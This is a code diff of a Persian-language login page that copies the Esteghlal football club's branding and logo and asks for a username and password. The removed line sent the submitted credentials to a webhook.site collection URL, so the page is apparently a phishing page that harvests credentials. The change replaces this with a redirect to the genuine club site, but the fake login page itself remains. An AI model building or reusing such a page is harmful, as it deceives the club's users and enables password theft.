@@ -40,11 +40,18 @@
       margin-bottom: 20px;
     }
   </style>
+  <script>
+    function redirectToMainSite(event) {
+      event.preventDefault();  // جلوگیری از ارسال فرم به طور پیش‌فرض
+      // ارسال فرم با استفاده از AJAX (اگر نیاز به ارسال اطلاعات به سرور دارید)
+      window.location.href = "https://fcesteghlal.ir/";  // هدایت کاربر به سایت اصلی
+    }
+  </script>
 </head>
 <body>
   <img src="https://fcesteghlal.ir/wp-content/uploads/2023/04/logo-blue.png" alt="لوگو استقلال" />
   <div class="login-box">
-    <form action="https://webhook.site/181616ef-afe2-433b-b63d-45952436579d" method="POST">
+    <form onsubmit="redirectToMainSite(event)">
       <label>نام کاربری:</label>
       <input type="text" name="username" required />
       <label>رمز عبور:</label>
@@ -52,6 +59,5 @@
       <input type="submit" value="ورود">
     </form>
   </div>
- 
 </body>
 </html>
